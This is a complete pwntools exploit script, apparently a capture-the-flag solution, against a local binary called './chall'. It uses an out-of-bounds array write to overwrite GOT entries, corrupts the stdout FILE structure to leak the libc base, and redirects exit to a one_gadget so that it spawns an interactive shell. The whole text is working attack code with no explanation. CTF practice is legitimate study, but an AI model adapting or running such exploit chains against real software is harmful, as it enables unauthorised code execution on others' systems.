from pwn import *


binpath = './chall'
elf = ELF(binpath)
libc = elf.libc

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']


gdbscript = '''
gef
b main
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = process(binpath)

def overwrite_dw(addr, value):
    io.sendlineafter(b'n = ', b'-1')
    index = addr / 4
    io.sendlineafter(b' = ', b'%d' % index)
    io.sendlineafter(b' = ', b'%d' % value)

def overwrite(addr, value):
    overwrite_dw(addr, value & 0xffffffff)
    overwrite_dw(addr + 4, value >> 32)

addr_ret = 0x4005ce

print("[+] Trigger infinite main loop")
overwrite_dw(elf.got['puts'], elf.symbols['main'])
print("[+] Disarm exit")
overwrite_dw(elf.got['exit'], addr_ret)

print("[+] Overwrite _IO_2_1_stdout")
mmap_threshold = 131072 * 2
off_mmap_io_2_1_stdout = 0x2ed690
io.sendlineafter(b'n = ', b'%d' % mmap_threshold)
index = off_mmap_io_2_1_stdout // 4
io.sendlineafter(b' = ', b'%d' % (index + 1))
io.sendlineafter(b' = ', b'%d' % 0xdeadbeef)

print("[+] setbuf -> printf")
overwrite(elf.got['setbuf'], elf.plt['printf'])

print("[+] Leak libc")
overwrite(elf.got['exit'], elf.symbols['setup'])
io.sendlineafter(b'n = ', b'%d' % 0x200)
data = io.recvuntil(b'i')[:-1].rstrip()[12:]
addr_libc = u64(data.ljust(8, b'\x00')) - 0x1ec723
print("[+] addr_libc = 0x{:08x}".format(addr_libc))
io.sendlineafter(b' = ', b'%d' % 0x18)
io.sendlineafter(b' = ', b'%d' % 0xdeadbeef)

print('[+] one_gadget')
off_one_gadgets = [0xe6c7e, 0xe6c81, 0xe6c84]
addr_one_gadget = addr_libc + off_one_gadgets[1]
print('[+] exit -> one_gadget')
overwrite(elf.got['exit'], addr_one_gadget)
print('[!] trigger')
io.sendlineafter(b'n = ', b'%d' % 0x200)

io.interactive()
